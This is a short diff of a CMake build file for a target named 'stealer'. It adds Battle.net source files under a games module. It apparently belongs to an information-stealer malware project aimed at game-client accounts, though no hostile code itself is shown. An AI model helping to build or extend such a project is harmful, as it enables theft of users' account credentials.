@@ -54,6 +54,8 @@ add_executable(stealer src/main.cpp
         src/utils/Base64Util.h
         include/sqlite3.c
         include/sqlite3.h
+        src/stealer/impl/games/impl/BattleNet.cpp
+        src/stealer/impl/games/impl/BattleNet.h
 )
 
 target_link_libraries(stealer
